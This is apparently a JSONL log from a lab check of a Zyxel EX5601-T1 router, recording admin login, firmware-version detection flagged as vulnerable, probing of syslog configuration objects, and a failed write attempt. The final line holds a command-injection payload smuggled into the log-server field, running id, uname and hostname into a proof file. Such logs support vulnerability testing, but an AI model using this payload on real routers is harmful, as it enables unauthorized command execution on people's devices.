@@ -1,0 +1,23 @@
+{"ts": "2026-09-12T19:42:21+00:00", "event": "login", "ok": true, "user": "admin", "sessionkey_present": true}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_firmware_oid", "oid": "DeviceInfo", "ok": true, "raw": "{'Object': [{'DeviceInfo': {'DeviceModel': 'EX5601-T1', 'Prod_Model': 'EX5601-T1', 'ZYXEL_FW_Ver': '5.70(ACDZ.6)C0', 'FirmwareVersion': '5.70(ACDZ.6)C0', 'SysVersion': '5.70(ACDZ.6)C0'}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_firmware_oid", "oid": "deviceInfo", "ok": true, "raw": "{'Object': [{'DeviceInfo': {'DeviceModel': 'EX5601-T1', 'Prod_Model': 'EX5601-T1', 'ZYXEL_FW_Ver': '5.70(ACDZ.6)C0', 'FirmwareVersion': '5.70(ACDZ.6)C0', 'SysVersion': '5.70(ACDZ.6)C0'}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_firmware_oid", "oid": "deviceinfo", "ok": true, "raw": "{'Object': [{'DeviceInfo': {'DeviceModel': 'EX5601-T1', 'Prod_Model': 'EX5601-T1', 'ZYXEL_FW_Ver': '5.70(ACDZ.6)C0', 'FirmwareVersion': '5.70(ACDZ.6)C0', 'SysVersion': '5.70(ACDZ.6)C0'}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_firmware_oid", "oid": "device_info", "ok": true, "raw": "{'Object': [{'DeviceInfo': {'DeviceModel': 'EX5601-T1', 'Prod_Model': 'EX5601-T1', 'ZYXEL_FW_Ver': '5.70(ACDZ.6)C0', 'FirmwareVersion': '5.70(ACDZ.6)C0', 'SysVersion': '5.70(ACDZ.6)C0'}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "firmware_verdict", "model": "EX5601-T1", "found_version": "5.70(ACDZ.6)C0", "verdict": "found '5.70(ACDZ.6)C0' -- looks VULNERABLE (advisory affected <= '5.70(ACDZ.6)C0'); verify manually"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_syslog_oid", "oid": "syslog", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "syslog", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "syslog", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_syslog_oid", "oid": "Syslog", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "Syslog", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "Syslog", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_syslog_oid", "oid": "logserver", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "logserver", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "logserver", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_syslog_oid", "oid": "logServer", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "logServer", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "logServer", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "discover_syslog_oid", "oid": "syslogSetting", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "syslogSetting", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "logserver_field_found", "oid": "syslogSetting", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "baseline", "oid": "syslogSetting", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T19:42:21+00:00", "event": "inject_write", "oid": "syslogSetting", "token": "c8554c39", "proof": "/tmp/zyxel6952_lab/proof_c8554c39.txt", "ok": false, "payload": "127.0.0.1\"; id > /tmp/zyxel6952_lab/proof_c8554c39.txt; uname -a >> /tmp/zyxel6952_lab/proof_c8554c39.txt; hostname >> /tmp/zyxel6952_lab/proof_c8554c39.txt; #", "response": "ConnectionError: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))"}
